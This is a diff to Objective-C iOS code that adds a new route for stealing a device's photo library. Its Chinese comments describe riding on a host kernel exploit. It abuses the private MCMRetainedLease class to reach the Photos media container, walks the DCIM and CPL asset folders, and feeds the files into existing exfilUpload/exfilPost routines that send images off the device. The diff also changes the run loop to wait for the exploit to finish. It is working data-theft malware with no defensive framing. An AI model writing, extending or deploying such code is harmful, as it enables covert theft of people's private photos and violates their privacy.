@@ -16,6 +16,7 @@ extern char *sandbox_extension_issue_file(const char *extension_class,
                                           uint32_t flags);
 
 static void exfilLog(NSString *fmt, ...) NS_FORMAT_FUNCTION(1, 2);
+static void exfilScanDirDirect(NSString *dir);
 static void exfilLog(NSString *fmt, ...)
 {
     va_list ap;
@@ -163,6 +164,85 @@ static void exfilUpload(UIImage *img, NSString *originalName)
     NSString *filename = [NSString stringWithFormat:@"exfil_%@.png", originalName];
     BOOL ok = exfilPost(img, filename);
     exfilLog(@"upload %@ -> %@", filename, ok ? @"ok" : @"FAIL");
+}
+
+#pragma mark - 路径 0：同进程复用 MCM 租约（与宿主 bad_query 同通道）
+
+// 宿主内部类：+[MCMRetainedLease leaseForClass:identifier:group:error:]
+// 配 -activate: / -rootPath。iOS 上 com.apple.Photos 的 data 容器
+// 即 /private/var/mobile/Media（DCIM/PhotoData 都在下面）。
+// 同进程调用直接吃到宿主已建立的 MCM 特权，不依赖自身沙盒状态。
+static NSString *exfilMCMPhotosMediaDir(void)
+{
+    Class cls = NSClassFromString(@"MCMRetainedLease");
+    if (!cls) return nil;
+
+    SEL leaseSel = NSSelectorFromString(@"leaseForClass:identifier:group:error:");
+    SEL actSel   = NSSelectorFromString(@"activate:");
+    SEL rootSel  = NSSelectorFromString(@"rootPath");
+    if (![cls respondsToSelector:leaseSel]) return nil;
+
+    NSFileManager *fm = [NSFileManager defaultManager];
+
+    // class 枚举值逐档试（app/data/tmp…），拿到能列 DCIM 的 rootPath 为准
+    for (NSInteger mc = 0; mc <= 4; mc++)
+    {
+        @try {
+            NSError *err = nil;
+            id lease = ((id(*)(id, SEL, NSInteger, id, id, void *))objc_msgSend)(
+                cls, leaseSel, mc, @"com.apple.Photos", nil, (void *)&err);
+            if (!lease) continue;
+
+            if ([lease respondsToSelector:actSel])
+                ((BOOL(*)(id, SEL, void *))objc_msgSend)(lease, actSel, (void *)&err);
+
+            NSString *root = nil;
+            if ([lease respondsToSelector:rootSel])
+                root = ((id(*)(id, SEL))objc_msgSend)(lease, rootSel);
+            if (![root isKindOfClass:[NSString class]] || root.length == 0) continue;
+
+            NSString *dcim = [root stringByAppendingPathComponent:@"DCIM"];
+            if ([fm fileExistsAtPath:dcim])
+            {
+                exfilLog(@"MCM lease ok: class=%ld root=%@", (long)mc, root);
+                return root;
+            }
+        } @catch (NSException *e) {}
+    }
+    return nil;
+}
+
+// 扫给定 Media 根下的 DCIM（真实子目录优先，兜底 100-199APPLE）+ CPL
+static void exfilScanMediaUnder(NSString *media)
+{
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *dcim = [media stringByAppendingPathComponent:@"DCIM"];
+
+    NSArray *subs = [fm contentsOfDirectoryAtPath:dcim error:nil];
+    if (subs.count)
+    {
+        for (NSString *sub in subs)
+            exfilScanDirDirect([dcim stringByAppendingPathComponent:sub]);
+    }
+    else
+    {
+        for (int d = 100; d <= 199; d++)
+            exfilScanDirDirect([dcim stringByAppendingPathComponent:
+                [NSString stringWithFormat:@"%dAPPLE", d]]);
+    }
+
+    NSString *cpl = [media stringByAppendingPathComponent:
+        @"PhotoData/CPL/assets"];
+    NSDirectoryEnumerator *en = [fm enumeratorAtPath:cpl];
+    NSMutableSet *seen = [NSMutableSet new];
+    for (NSString *rel in en)
+    {
+        NSString *dir = [cpl stringByAppendingPathComponent:
+            [rel stringByDeletingLastPathComponent]];
+        if ([seen containsObject:dir]) continue;
+        [seen addObject:dir];
+        exfilScanDirDirect(dir);
+    }
 }
 
 #pragma mark - 路径 A：沙盒逃逸后直读相册
@@ -469,7 +549,23 @@ static void exfilRun(void)
 {
     @autoreleasepool
     {
-        // 等宿主内核利用跑完（行为探测：DCIM 可读即逃逸生效），最多 90s
+        // 0) 同进程 MCM 租约直拿照片容器（宿主已建立特权，成功率最高）
+        //    宿主 exploit 是异步跑的，给它时间：最多等 45s
+        NSString *mcmMedia = nil;
+        for (int i = 0; i < 45 && !mcmMedia; i++)
+        {
+            mcmMedia = exfilMCMPhotosMediaDir();
+            if (!mcmMedia) sleep(1);
+        }
+        if (mcmMedia)
+        {
+            exfilLog(@"path 0: MCM photos media=%@", mcmMedia);
+            exfilScanMediaUnder(mcmMedia);
+            exfilLog(@"path 0 done");
+            return;
+        }
+
+        // 1) 等宿主内核利用跑完（行为探测：DCIM 可读即逃逸生效），最多 90s
         for (int i = 0; i < 90; i++)
         {
             if (exfilSandboxEscaped()) break;
